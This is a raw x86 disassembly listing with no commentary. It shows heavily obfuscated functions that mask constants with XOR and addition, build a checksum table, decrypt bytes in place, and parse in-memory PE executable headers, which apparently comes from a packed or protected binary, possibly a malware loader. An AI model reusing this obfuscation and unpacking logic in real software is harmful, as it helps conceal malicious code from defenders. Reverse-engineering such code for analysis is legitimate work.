  427ce0:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  427ce7:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  427cee:	mov    eax,DWORD PTR [ebx]
  427cf0:	mov    DWORD PTR [ebp-0x8],eax
  427cf3:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  427cfa:	push   esi
  427cfb:	push   edi
  427cfc:	mov    DWORD PTR [ebp-0x14],0xead71899
  427d03:	mov    edi,DWORD PTR [ebp-0x4]
  427d06:	mov    ecx,DWORD PTR [ebp-0x10]
  427d09:	mov    eax,0x75108a8
  427d0e:	xor    edi,eax
  427d10:	mov    edx,0x3272ef
  427d15:	xor    ecx,eax
  427d17:	add    edi,edx
  427d19:	add    ecx,edx
  427d1b:	imul   edi,ecx
  427d1e:	jmp    0x427d66
  427d20:	mov    ecx,DWORD PTR [ebp-0x8]
  427d23:	mov    esi,DWORD PTR [ebp-0x4]
  427d26:	xor    ecx,eax
  427d28:	xor    esi,eax
  427d2a:	add    ecx,edx
  427d2c:	add    esi,edx
  427d2e:	test   esi,ecx
  427d30:	mov    esi,DWORD PTR [ebp-0x8]
  427d33:	mov    ecx,DWORD PTR [ebp-0x4]
  427d36:	je     0x427d4d
  427d38:	xor    ecx,eax
  427d3a:	xor    esi,eax
  427d3c:	add    ecx,edx
  427d3e:	add    esi,edx
  427d40:	shr    esi,cl
  427d42:	mov    ecx,DWORD PTR [ebp-0x14]
  427d45:	xor    ecx,eax
  427d47:	add    ecx,edx
  427d49:	xor    esi,ecx
  427d4b:	jmp    0x427d57
  427d4d:	xor    esi,eax
  427d4f:	xor    ecx,eax
  427d51:	add    esi,edx
  427d53:	add    ecx,edx
  427d55:	shr    esi,cl
  427d57:	mov    DWORD PTR [ebp-0x8],esi
  427d5a:	mov    ecx,DWORD PTR [ebp-0x4]
  427d5d:	xor    ecx,eax
  427d5f:	lea    edi,[edi+ecx*1+0x3272ef]
  427d66:	mov    ecx,DWORD PTR [ebp-0xc]
  427d69:	mov    esi,DWORD PTR [ebp-0x4]
  427d6c:	xor    esi,eax
  427d6e:	xor    ecx,eax
  427d70:	sub    ecx,esi
  427d72:	cmp    edi,ecx
  427d74:	jbe    0x427d20
  427d76:	mov    eax,DWORD PTR [ebp-0x8]
  427d79:	pop    edi
  427d7a:	mov    DWORD PTR [ebx],eax
  427d7c:	mov    eax,DWORD PTR [ebp-0x8]
  427d7f:	pop    esi
  427d80:	leave  
  427d81:	ret    
  427d82:	push   ebp
  427d83:	mov    ebp,esp
  427d85:	sub    esp,0x38
  427d88:	push   ebx
  427d89:	mov    ebx,0xf89c85b9
  427d8e:	mov    DWORD PTR [ebp-0x4],ebx
  427d91:	lea    ecx,[ebx+0x1]
  427d94:	mov    DWORD PTR [ebp-0x24],ecx
  427d97:	mov    eax,DWORD PTR [ebp-0x4]
  427d9a:	mov    edx,DWORD PTR [ebp+0x8]
  427d9d:	push   esi
  427d9e:	mov    esi,0x75108a8
  427da3:	xor    eax,esi
  427da5:	push   edi
  427da6:	mov    edi,0x3272ef
  427dab:	add    eax,edi
  427dad:	cmp    edx,eax
  427daf:	mov    eax,DWORD PTR [ebp-0x4]
  427db2:	je     0x427f16
  427db8:	mov    edx,DWORD PTR [ebp+0xc]
  427dbb:	xor    eax,esi
  427dbd:	add    eax,edi
  427dbf:	cmp    edx,eax
  427dc1:	je     0x427f13
  427dc7:	mov    eax,DWORD PTR [ebp+0x10]
  427dca:	mov    edx,DWORD PTR [ebp+0xc]
  427dcd:	mov    DWORD PTR [ebp-0x14],eax
  427dd0:	mov    eax,DWORD PTR [ebp+0x8]
  427dd3:	mov    DWORD PTR [ebp-0x18],0xf89c853e
  427dda:	mov    DWORD PTR [ebp-0xc],eax
  427ddd:	lea    eax,[ebx+0x2]
  427de0:	mov    DWORD PTR [ebp-0x1c],eax
  427de3:	mov    DWORD PTR [ebp-0x10],ebx
  427de6:	mov    DWORD PTR [ebp+0xc],ecx
  427de9:	mov    DWORD PTR [ebp+0x10],eax
  427dec:	mov    eax,DWORD PTR [ebp+0xc]
  427def:	xor    eax,esi
  427df1:	mov    DWORD PTR [ebp-0x20],edx
  427df4:	sub    edx,eax
  427df6:	sub    edx,edi
  427df8:	mov    DWORD PTR [ebp+0x8],edx
  427dfb:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  427e02:	jmp    0x427f03
  427e07:	mov    eax,DWORD PTR [ebp+0xc]
  427e0a:	mov    ecx,DWORD PTR [ebp+0xc]
  427e0d:	xor    eax,esi
  427e0f:	xor    ecx,esi
  427e11:	lea    ecx,[eax+ecx*1+0x64e5de]
  427e18:	mov    eax,DWORD PTR [ebp+0x8]
  427e1b:	xor    edx,edx
  427e1d:	div    ecx
  427e1f:	mov    eax,DWORD PTR [ebp+0x10]
  427e22:	mov    ecx,DWORD PTR [ebp+0xc]
  427e25:	xor    eax,esi
  427e27:	xor    ecx,esi
  427e29:	sub    eax,ecx
  427e2b:	cmp    edx,eax
  427e2d:	jne    0x427ec2
  427e33:	mov    eax,DWORD PTR [ebp+0x8]
  427e36:	mov    ecx,DWORD PTR [ebp-0xc]
  427e39:	mov    dl,BYTE PTR [eax+ecx*1]
  427e3c:	mov    eax,DWORD PTR [ebp-0x10]
  427e3f:	mov    ecx,DWORD PTR [ebp-0x8]
  427e42:	xor    eax,esi
  427e44:	xor    ecx,esi
  427e46:	add    eax,edi
  427e48:	add    ecx,edi
  427e4a:	cmp    eax,ecx
  427e4c:	jae    0x427e94
  427e4e:	lea    ecx,[eax-0x3272ef]
  427e54:	mov    DWORD PTR [ebp-0x4],ecx
  427e57:	mov    ebx,DWORD PTR [ebp-0x4]
  427e5a:	xor    ebx,esi
  427e5c:	add    ebx,0x7f55d8fb
  427e62:	lea    ecx,[ebp+eax*4-0x38]
  427e66:	mov    DWORD PTR [ecx],ebx
  427e68:	mov    ebx,DWORD PTR [ecx]
  427e6a:	cmp    ebx,0x244ecb9c
  427e70:	jbe    0x427e7a
  427e72:	add    DWORD PTR [ecx],0x405fcdd
  427e78:	jmp    0x427e80
  427e7a:	add    DWORD PTR [ecx],0xfdaf4323
  427e80:	mov    ecx,DWORD PTR [ebp-0x8]
  427e83:	xor    ecx,esi
  427e85:	inc    eax
  427e86:	inc    DWORD PTR [ebp-0x4]
  427e89:	add    ecx,edi
  427e8b:	cmp    eax,ecx
  427e8d:	jb     0x427e57
  427e8f:	mov    ebx,0xf89c85b9
  427e94:	cmp    DWORD PTR [ebp-0x14],0x0
  427e98:	jne    0x427ea1
  427e9a:	xor    dl,0x7b
  427e9d:	dec    dl
  427e9f:	jmp    0x427eb7
  427ea1:	mov    eax,DWORD PTR [ebp-0x18]
  427ea4:	xor    al,0xa8
  427ea6:	mov    cl,0x11
  427ea8:	sub    cl,al
  427eaa:	add    dl,cl
  427eac:	mov    ecx,DWORD PTR [ebp-0x1c]
  427eaf:	xor    cl,0xa8
  427eb2:	sub    cl,0x11
  427eb5:	ror    dl,cl
  427eb7:	xor    eax,eax
  427eb9:	mov    eax,DWORD PTR [ebp+0x8]
  427ebc:	mov    ecx,DWORD PTR [ebp-0xc]
  427ebf:	mov    BYTE PTR [eax+ecx*1],dl
  427ec2:	mov    eax,DWORD PTR [ebp+0x8]
  427ec5:	mov    ecx,DWORD PTR [ebp-0x10]
  427ec8:	sub    eax,edi
  427eca:	xor    eax,esi
  427ecc:	cmp    eax,ecx
  427ece:	jne    0x427ef1
  427ed0:	mov    eax,DWORD PTR [ebp+0x10]
  427ed3:	mov    ecx,DWORD PTR [ebp+0xc]
  427ed6:	xor    eax,esi
  427ed8:	xor    ecx,esi
  427eda:	sub    eax,ecx
  427edc:	mov    ecx,DWORD PTR [ebp-0x20]
  427edf:	sub    eax,edi
  427ee1:	xor    eax,esi
  427ee3:	mov    DWORD PTR [ebp+0x10],eax
  427ee6:	mov    eax,DWORD PTR [ebp+0xc]
  427ee9:	xor    eax,esi
  427eeb:	sub    ecx,eax
  427eed:	sub    ecx,edi
  427eef:	jmp    0x427f00
  427ef1:	mov    eax,DWORD PTR [ebp+0xc]
  427ef4:	xor    eax,esi
  427ef6:	mov    ecx,0xffcd8d11
  427efb:	sub    ecx,eax
  427efd:	add    ecx,DWORD PTR [ebp+0x8]
  427f00:	mov    DWORD PTR [ebp+0x8],ecx
  427f03:	mov    eax,DWORD PTR [ebp+0x10]
  427f06:	cmp    eax,ebx
  427f08:	jne    0x427e07
  427f0e:	mov    eax,DWORD PTR [ebp-0x24]
  427f11:	jmp    0x427f16
  427f13:	mov    eax,DWORD PTR [ebp-0x4]
  427f16:	xor    eax,esi
  427f18:	add    eax,edi
  427f1a:	pop    edi
  427f1b:	pop    esi
  427f1c:	pop    ebx
  427f1d:	leave  
  427f1e:	ret    0xc
  427f21:	push   ebp
  427f22:	mov    ebp,esp
  427f24:	sub    esp,0x420
  427f2a:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  427f31:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  427f38:	mov    DWORD PTR [ebp-0x18],0xf89c86b9
  427f3f:	push   ebx
  427f40:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  427f47:	mov    eax,DWORD PTR [ebp-0x14]
  427f4a:	push   esi
  427f4b:	mov    esi,0x75108a8
  427f50:	push   edi
  427f51:	xor    eax,esi
  427f53:	mov    edi,0x3272ef
  427f58:	add    eax,edi
  427f5a:	mov    DWORD PTR [ebp-0x8],eax
  427f5d:	mov    DWORD PTR [ebp-0x20],0xf89c85b1
  427f64:	mov    DWORD PTR [ebp-0x4],0xead71899
  427f6b:	mov    DWORD PTR [ebp-0x10],0x8
  427f72:	mov    ecx,ecx
  427f74:	mov    eax,DWORD PTR [ebp-0xc]
  427f77:	mov    ecx,DWORD PTR [ebp-0x14]
  427f7a:	xor    eax,esi
  427f7c:	xor    ecx,esi
  427f7e:	add    eax,edi
  427f80:	add    ecx,edi
  427f82:	imul   eax,ecx
  427f85:	jmp    0x427fb8
  427f87:	mov    eax,DWORD PTR [ebp-0x4]
  427f8a:	sub    eax,edi
  427f8c:	xor    eax,esi
  427f8e:	mov    DWORD PTR [ebp-0x8],eax
  427f91:	lea    ebx,[ebp-0x8]
  427f94:	call   0x427cda
  427f99:	mov    DWORD PTR [ebp-0x8],eax
  427f9c:	mov    eax,DWORD PTR [ebp-0x8]
  427f9f:	mov    ecx,DWORD PTR [ebp-0x4]
  427fa2:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  427fa9:	mov    eax,DWORD PTR [ebp-0xc]
  427fac:	mov    ecx,DWORD PTR [ebp-0x4]
  427faf:	xor    eax,esi
  427fb1:	lea    eax,[eax+ecx*1+0x3272ef]
  427fb8:	mov    DWORD PTR [ebp-0x4],eax
  427fbb:	mov    eax,DWORD PTR [ebp-0x18]
  427fbe:	mov    ecx,DWORD PTR [ebp-0xc]
  427fc1:	xor    ecx,esi
  427fc3:	xor    eax,esi
  427fc5:	sub    eax,ecx
  427fc7:	mov    ecx,DWORD PTR [ebp-0x4]
  427fca:	cmp    ecx,eax
  427fcc:	jbe    0x427f87
  427fce:	mov    eax,DWORD PTR [ebp-0x1c]
  427fd1:	xor    eax,esi
  427fd3:	add    eax,edi
  427fd5:	mov    DWORD PTR [ebp-0x8],eax
  427fd8:	mov    DWORD PTR [ebp-0x18],0xf89c86b8
  427fdf:	mov    ebx,ebx
  427fe1:	jmp    0x428044
  427fe3:	mov    ecx,DWORD PTR [ebp-0x20]
  427fe6:	mov    eax,DWORD PTR [ebp-0x8]
  427fe9:	xor    ecx,esi
  427feb:	add    ecx,edi
  427fed:	shr    eax,cl
  427fef:	mov    DWORD PTR [ebp-0x4],eax
  427ff2:	mov    eax,DWORD PTR [ebp+0x8]
  427ff5:	mov    cl,BYTE PTR [eax]
  427ff7:	mov    BYTE PTR [ebp+0xb],cl
  427ffa:	mov    cl,BYTE PTR [ebp+0xb]
  427ffd:	mov    edx,DWORD PTR [ebp-0x8]
  428000:	movzx  ecx,cl
  428003:	xor    ecx,edx
  428005:	mov    DWORD PTR [ebp+0x8],ecx
  428008:	mov    ecx,DWORD PTR [ebp-0x18]
  42800b:	mov    edx,DWORD PTR [ebp+0x8]
  42800e:	xor    ecx,esi
  428010:	add    ecx,edi
  428012:	and    ecx,edx
  428014:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  42801b:	mov    edx,DWORD PTR [ebp-0x4]
  42801e:	xor    ecx,edx
  428020:	mov    DWORD PTR [ebp-0x8],ecx
  428023:	mov    ecx,DWORD PTR [ebp-0xc]
  428026:	xor    ecx,esi
  428028:	lea    eax,[eax+ecx*1+0x3272ef]
  42802f:	mov    DWORD PTR [ebp+0x8],eax
  428032:	mov    eax,DWORD PTR [ebp-0xc]
  428035:	xor    eax,esi
  428037:	mov    ecx,0xffcd8d11
  42803c:	sub    ecx,eax
  42803e:	add    ecx,DWORD PTR [ebp-0x10]
  428041:	mov    DWORD PTR [ebp-0x10],ecx
  428044:	mov    eax,DWORD PTR [ebp-0x14]
  428047:	mov    ecx,DWORD PTR [ebp-0x10]
  42804a:	xor    eax,esi
  42804c:	add    eax,edi
  42804e:	cmp    ecx,eax
  428050:	jne    0x427fe3
  428052:	mov    eax,DWORD PTR [ebp-0x1c]
  428055:	mov    ecx,DWORD PTR [ebp-0x8]
  428058:	xor    eax,esi
  42805a:	add    eax,edi
  42805c:	pop    edi
  42805d:	pop    esi
  42805e:	xor    eax,ecx
  428060:	pop    ebx
  428061:	leave  
  428062:	ret    0x4
  428065:	push   ebp
  428066:	mov    ebp,esp
  428068:	mov    eax,DWORD PTR [ebp+0x1c]
  42806b:	mov    ecx,DWORD PTR [ebp+0x8]
  42806e:	mov    edx,DWORD PTR [ebp+0x10]
  428071:	mov    eax,DWORD PTR [eax+0x190]
  428077:	mov    eax,DWORD PTR [eax]
  428079:	sub    esp,0x64
  42807c:	push   ebx
  42807d:	push   esi
  42807e:	push   edi
  42807f:	mov    edi,0x75108a8
  428084:	xor    ecx,edi
  428086:	mov    ebx,0x3272ef
  42808b:	add    ecx,ebx
  42808d:	cmp    ecx,edx
  42808f:	jne    0x4280a0
  428091:	or     DWORD PTR ds:0x3750c3f,0x4263eb20
  42809b:	jmp    0x42859c
  4280a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4280a3:	mov    esi,DWORD PTR [ebp+0x14]
  4280a6:	mov    edx,DWORD PTR [esi]
  4280a8:	xor    ecx,edi
  4280aa:	add    ecx,ebx
  4280ac:	cmp    edx,ecx
  4280ae:	je     0x428557
  4280b4:	mov    ecx,DWORD PTR [ebp+0x1c]
  4280b7:	mov    DWORD PTR [ebp-0x1c],eax
  4280ba:	mov    DWORD PTR [ebp+0x1c],ecx
  4280bd:	mov    ecx,DWORD PTR [ebp+0x18]
  4280c0:	mov    eax,DWORD PTR [esi]
  4280c2:	mov    DWORD PTR [ebp-0x20],eax
  4280c5:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  4280cc:	mov    edx,0xf89c85ba
  4280d1:	mov    DWORD PTR [ebp-0x8],edx
  4280d4:	mov    eax,DWORD PTR [ebp+0x1c]
  4280d7:	mov    DWORD PTR [ebp+0x1c],eax
  4280da:	mov    eax,DWORD PTR [ebp+0x1c]
  4280dd:	mov    eax,DWORD PTR [eax+0x190]
  4280e3:	mov    eax,DWORD PTR [eax]
  4280e5:	mov    DWORD PTR [ebp-0x24],ecx
  4280e8:	mov    ecx,DWORD PTR [ebp+0x1c]
  4280eb:	mov    ecx,DWORD PTR [ecx+0x190]
  4280f1:	mov    ecx,DWORD PTR [ecx]
  4280f3:	add    ecx,DWORD PTR [eax+0x3c]
  4280f6:	mov    DWORD PTR [ebp+0x10],ecx
  4280f9:	mov    eax,DWORD PTR [ebp+0x8]
  4280fc:	xor    eax,edi
  4280fe:	add    eax,ebx
  428100:	mov    DWORD PTR [ebp-0x4],eax
  428103:	mov    eax,DWORD PTR [ebp+0x8]
  428106:	xor    eax,edi
  428108:	add    eax,ebx
  42810a:	mov    DWORD PTR [ebp+0x18],eax
  42810d:	mov    eax,DWORD PTR [ebp+0x10]
  428110:	mov    eax,DWORD PTR [eax+0x50]
  428113:	sub    eax,0xc
  428116:	mov    DWORD PTR [ebp-0x28],eax
  428119:	mov    eax,DWORD PTR [ebp+0x10]
  42811c:	mov    eax,DWORD PTR [eax+0x38]
  42811f:	mov    ecx,DWORD PTR [ebp+0x10]
  428122:	dec    eax
  428123:	test   DWORD PTR [ecx+0x54],eax
  428126:	mov    eax,DWORD PTR [ebp+0x10]
  428129:	je     0x428143
  42812b:	mov    eax,DWORD PTR [eax+0x38]
  42812e:	mov    ecx,DWORD PTR [ebp+0x10]
  428131:	mov    ecx,DWORD PTR [ecx+0x54]
  428134:	dec    eax
  428135:	not    eax
  428137:	and    ecx,eax
  428139:	mov    eax,DWORD PTR [ebp+0x10]
  42813c:	mov    eax,DWORD PTR [eax+0x38]
  42813f:	add    eax,ecx
  428141:	jmp    0x428146
  428143:	mov    eax,DWORD PTR [eax+0x54]
  428146:	mov    DWORD PTR [ebp+0x1c],eax
  428149:	mov    eax,DWORD PTR [ebp+0x8]
  42814c:	xor    eax,edi
  42814e:	add    eax,ebx
  428150:	mov    DWORD PTR [ebp+0x18],eax
  428153:	mov    eax,DWORD PTR [ebp+0x8]
  428156:	xor    eax,edi
  428158:	add    eax,ebx
  42815a:	mov    DWORD PTR [ebp+0x18],eax
  42815d:	mov    eax,DWORD PTR [ebp+0x8]
  428160:	mov    ecx,DWORD PTR [ebp-0x24]
  428163:	xor    eax,edi
  428165:	add    eax,ebx
  428167:	mov    DWORD PTR [ecx],eax
  428169:	mov    DWORD PTR [ebp+0x18],edx
  42816c:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  428173:	mov    DWORD PTR [ebp+0x18],0xf89c85bc
  42817a:	mov    DWORD PTR [ebp+0x18],0xf89c85bd
  428181:	mov    eax,DWORD PTR [ebp-0x8]
  428184:	mov    ecx,DWORD PTR [ebp+0x1c]
  428187:	xor    eax,edi
  428189:	add    eax,ebx
  42818b:	imul   eax,ecx
  42818e:	mov    ecx,DWORD PTR [ebp+0x8]
  428191:	mov    edx,DWORD PTR [ebp-0x28]
  428194:	xor    ecx,edi
  428196:	lea    ecx,[ecx+edx*1+0x3272ef]
  42819d:	cmp    eax,ecx
  42819f:	jae    0x428550
  4281a5:	mov    eax,DWORD PTR [ebp+0x8]
  4281a8:	xor    eax,edi
  4281aa:	add    eax,ebx
  4281ac:	mov    DWORD PTR [ebp+0x18],eax
  4281af:	mov    eax,DWORD PTR [ebp+0x1c]
  4281b2:	add    eax,DWORD PTR [ebp-0x1c]
  4281b5:	mov    DWORD PTR [ebp-0x4],eax
  4281b8:	push   DWORD PTR [ebp-0x4]
  4281bb:	mov    esi,DWORD PTR [ebp-0x1c]
  4281be:	mov    ecx,DWORD PTR [ebp+0x10]
  4281c1:	call   0x427315
  4281c6:	mov    DWORD PTR [ebp+0xc],eax
  4281c9:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  4281d0:	mov    eax,DWORD PTR [ebp-0x18]
  4281d3:	xor    eax,edi
  4281d5:	lea    ecx,[ebp-0x40]
  4281d8:	add    eax,ebx
  4281da:	push   ecx
  4281db:	call   0x4278a7
  4281e0:	mov    eax,DWORD PTR [ebp+0xc]
  4281e3:	test   eax,eax
  4281e5:	je     0x428235
  4281e7:	mov    eax,DWORD PTR [ebp-0x18]
  4281ea:	xor    eax,edi
  4281ec:	add    eax,ebx
  4281ee:	push   eax
  4281ef:	push   DWORD PTR [ebp+0xc]
  4281f2:	lea    eax,[ebp-0x40]
  4281f5:	push   eax
  4281f6:	call   0x42779d
  4281fb:	mov    eax,DWORD PTR [ebp-0x4]
  4281fe:	mov    DWORD PTR [ebp-0x18],eax
  428201:	mov    eax,DWORD PTR [ebp-0x18]
  428204:	mov    ecx,DWORD PTR [ebp-0x1c]
  428207:	sub    eax,ecx
  428209:	mov    DWORD PTR [ebp-0x18],eax
  42820c:	mov    eax,DWORD PTR [ebp+0xc]
  42820f:	mov    ecx,DWORD PTR [ebp+0xc]
  428212:	mov    eax,DWORD PTR [eax+0x10]
  428215:	add    eax,DWORD PTR [ecx+0xc]
  428218:	mov    ecx,DWORD PTR [ebp-0x18]
  42821b:	cmp    ecx,eax
  42821d:	jb     0x428235
  42821f:	mov    eax,DWORD PTR [ebp+0xc]
  428222:	mov    eax,DWORD PTR [eax+0xc]
  428225:	mov    ecx,DWORD PTR [ebp+0xc]
  428228:	add    eax,DWORD PTR [ecx+0x8]
  42822b:	mov    ecx,DWORD PTR [ebp-0x18]
  42822e:	sub    eax,ecx
  428230:	jmp    0x428523
  428235:	push   0xc
  428237:	push   DWORD PTR [ebp-0x4]
  42823a:	lea    eax,[ebp-0x4c]
  42823d:	push   eax
  42823e:	call   0x42779d
  428243:	mov    eax,0xf89c85b9
  428248:	mov    DWORD PTR [ebp-0x2c],eax
  42824b:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  428252:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  428259:	mov    DWORD PTR [ebp-0x38],0xf89c85bc
  428260:	lea    ecx,[ebp-0x2c]
  428263:	mov    DWORD PTR [ebp-0xc],ecx
  428266:	lea    ecx,[ebp-0x30]
  428269:	mov    DWORD PTR [ebp-0x10],ecx
  42826c:	lea    ecx,[ebp-0x34]
  42826f:	mov    DWORD PTR [ebp+0xc],ecx
  428272:	lea    ecx,[ebp-0x38]
  428275:	mov    DWORD PTR [ebp-0x14],ecx
  428278:	mov    ecx,DWORD PTR [ebp+0x8]
  42827b:	xor    ecx,edi
  42827d:	add    ecx,ebx
  42827f:	mov    DWORD PTR [ebp-0x18],ecx
  428282:	jmp    0x42847e
  428287:	cmp    eax,0xf89c85bb
  42828c:	je     0x428490
  428292:	mov    ecx,DWORD PTR [ebp-0x8]
  428295:	xor    ecx,edi
  428297:	mov    esi,eax
  428299:	add    ecx,ebx
  42829b:	mov    DWORD PTR [ebp+0x18],ecx
  42829e:	mov    eax,DWORD PTR [ebp-0x18]
  4282a1:	xor    esi,edi
  4282a3:	lea    eax,[eax+esi*1+0x3272ef]
  4282aa:	mov    DWORD PTR [ebp-0x18],eax
  4282ad:	mov    eax,DWORD PTR [ebp-0x8]
  4282b0:	mov    ecx,DWORD PTR [ebp-0x18]
  4282b3:	xor    eax,edi
  4282b5:	add    eax,ebx
  4282b7:	cmp    ecx,eax
  4282b9:	jne    0x4282ce
  4282bb:	mov    eax,DWORD PTR [ebp+0x8]
  4282be:	xor    eax,edi
  4282c0:	add    eax,ebx
  4282c2:	push   eax
  4282c3:	push   0xc
  4282c5:	lea    eax,[ebp-0x4c]
  4282c8:	push   eax
  4282c9:	call   0x427d82
  4282ce:	mov    eax,DWORD PTR [ebp-0xc]
  4282d1:	mov    eax,DWORD PTR [eax]
  4282d3:	xor    eax,edi
  4282d5:	mov    al,BYTE PTR [ebp+eax*1+0x3272a3]
  4282dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4282df:	xor    ecx,edi
  4282e1:	movzx  eax,al
  4282e4:	add    ecx,ebx
  4282e6:	cmp    eax,ecx
  4282e8:	je     0x428466
  4282ee:	mov    eax,DWORD PTR [ebp-0x10]
  4282f1:	mov    eax,DWORD PTR [eax]
  4282f3:	xor    eax,edi
  4282f5:	mov    al,BYTE PTR [ebp+eax*1+0x3272a3]
  4282fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4282ff:	xor    ecx,edi
  428301:	movzx  eax,al
  428304:	add    ecx,ebx
  428306:	cmp    eax,ecx
  428308:	je     0x428466
  42830e:	mov    eax,DWORD PTR [ebp+0xc]
  428311:	mov    eax,DWORD PTR [eax]
  428313:	xor    eax,edi
  428315:	mov    al,BYTE PTR [ebp+eax*1+0x3272a3]
  42831c:	mov    ecx,DWORD PTR [ebp+0x8]
  42831f:	xor    ecx,edi
  428321:	movzx  eax,al
  428324:	add    ecx,ebx
  428326:	cmp    eax,ecx
  428328:	je     0x428466
  42832e:	mov    eax,DWORD PTR [ebp-0x14]
  428331:	mov    eax,DWORD PTR [eax]
  428333:	xor    eax,edi
  428335:	mov    al,BYTE PTR [ebp+eax*1+0x3272a3]
  42833c:	mov    ecx,DWORD PTR [ebp+0x8]
  42833f:	xor    ecx,edi
  428341:	movzx  eax,al
  428344:	add    ecx,ebx
  428346:	cmp    eax,ecx
  428348:	je     0x428466
  42834e:	mov    eax,DWORD PTR [ebp-0x10]
  428351:	mov    eax,DWORD PTR [eax]
  428353:	xor    eax,edi
  428355:	mov    al,BYTE PTR [ebp+eax*1+0x3272a3]
  42835c:	mov    ecx,DWORD PTR [ebp-0xc]
  42835f:	mov    ecx,DWORD PTR [ecx]
  428361:	xor    ecx,edi
  428363:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a3]
  42836a:	xor    al,cl
  42836c:	mov    ecx,DWORD PTR [ebp+0xc]
  42836f:	mov    ecx,DWORD PTR [ecx]
  428371:	xor    ecx,edi
  428373:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a3]
  42837a:	or     al,cl
  42837c:	mov    ecx,DWORD PTR [ebp-0xc]
  42837f:	mov    ecx,DWORD PTR [ecx]
  428381:	xor    ecx,edi
  428383:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a7]
  42838a:	cmp    cl,al
  42838c:	jne    0x428466
  428392:	mov    eax,DWORD PTR [ebp+0xc]
  428395:	mov    eax,DWORD PTR [eax]
  428397:	xor    eax,edi
  428399:	mov    al,BYTE PTR [ebp+eax*1+0x3272a3]
  4283a0:	mov    ecx,DWORD PTR [ebp-0x10]
  4283a3:	mov    ecx,DWORD PTR [ecx]
  4283a5:	xor    ecx,edi
  4283a7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a3]
  4283ae:	xor    al,cl
  4283b0:	mov    ecx,DWORD PTR [ebp-0x14]
  4283b3:	mov    ecx,DWORD PTR [ecx]
  4283b5:	xor    ecx,edi
  4283b7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a3]
  4283be:	or     al,cl
  4283c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4283c3:	mov    ecx,DWORD PTR [ecx]
  4283c5:	xor    ecx,edi
  4283c7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a7]
  4283ce:	cmp    cl,al
  4283d0:	jne    0x428466
  4283d6:	mov    eax,DWORD PTR [ebp-0x14]
  4283d9:	mov    eax,DWORD PTR [eax]
  4283db:	xor    eax,edi
  4283dd:	mov    al,BYTE PTR [ebp+eax*1+0x3272a3]
  4283e4:	mov    ecx,DWORD PTR [ebp+0xc]
  4283e7:	mov    ecx,DWORD PTR [ecx]
  4283e9:	xor    ecx,edi
  4283eb:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a3]
  4283f2:	xor    al,cl
  4283f4:	mov    ecx,DWORD PTR [ebp-0xc]
  4283f7:	mov    ecx,DWORD PTR [ecx]
  4283f9:	xor    ecx,edi
  4283fb:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a3]
  428402:	or     al,cl
  428404:	mov    ecx,DWORD PTR [ebp+0xc]
  428407:	mov    ecx,DWORD PTR [ecx]
  428409:	xor    ecx,edi
  42840b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a7]
  428412:	cmp    cl,al
  428414:	jne    0x428466
  428416:	mov    eax,DWORD PTR [ebp-0x14]
  428419:	mov    eax,DWORD PTR [eax]
  42841b:	xor    eax,edi
  42841d:	mov    al,BYTE PTR [ebp+eax*1+0x3272a3]
  428424:	mov    ecx,DWORD PTR [ebp-0xc]
  428427:	mov    ecx,DWORD PTR [ecx]
  428429:	xor    ecx,edi
  42842b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a3]
  428432:	xor    al,cl
  428434:	mov    ecx,DWORD PTR [ebp-0x10]
  428437:	mov    ecx,DWORD PTR [ecx]
  428439:	xor    ecx,edi
  42843b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a3]
  428442:	or     al,cl
  428444:	mov    ecx,DWORD PTR [ebp-0x14]
  428447:	mov    ecx,DWORD PTR [ecx]
  428449:	xor    ecx,edi
  42844b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a7]
  428452:	cmp    cl,al
  428454:	jne    0x428466
  428456:	lea    eax,[ebp-0x4c]
  428459:	push   eax
  42845a:	call   0x427f21
  42845f:	mov    ecx,DWORD PTR [ebp-0x44]
  428462:	cmp    eax,ecx
  428464:	je     0x428470
  428466:	mov    eax,DWORD PTR [ebp+0x8]
  428469:	xor    eax,edi
  42846b:	add    eax,ebx
  42846d:	mov    DWORD PTR [ebp+0x18],eax
  428470:	mov    eax,DWORD PTR [ebp-0x8]
  428473:	xor    eax,edi
  428475:	lea    eax,[eax+esi*1+0x3272ef]
  42847c:	xor    eax,edi
  42847e:	mov    ecx,DWORD PTR [ebp+0x8]
  428481:	mov    edx,DWORD PTR [ebp+0x18]
  428484:	xor    ecx,edi
  428486:	add    ecx,ebx
  428488:	cmp    edx,ecx
  42848a:	je     0x428287
  428490:	mov    eax,DWORD PTR [ebp+0x8]
  428493:	mov    ecx,DWORD PTR [ebp+0x18]
  428496:	xor    eax,edi
  428498:	add    eax,ebx
  42849a:	cmp    ecx,eax
  42849c:	jne    0x4284af
  42849e:	mov    eax,DWORD PTR [ebp-0x8]
  4284a1:	mov    ecx,DWORD PTR [ebp+0x1c]
  4284a4:	xor    eax,edi
  4284a6:	lea    eax,[eax+ecx*1+0x3272ef]
  4284ad:	jmp    0x428526
  4284af:	push   0x18
  4284b1:	push   DWORD PTR [ebp-0x4]
  4284b4:	lea    eax,[ebp-0x64]
  4284b7:	push   eax
  4284b8:	call   0x42779d
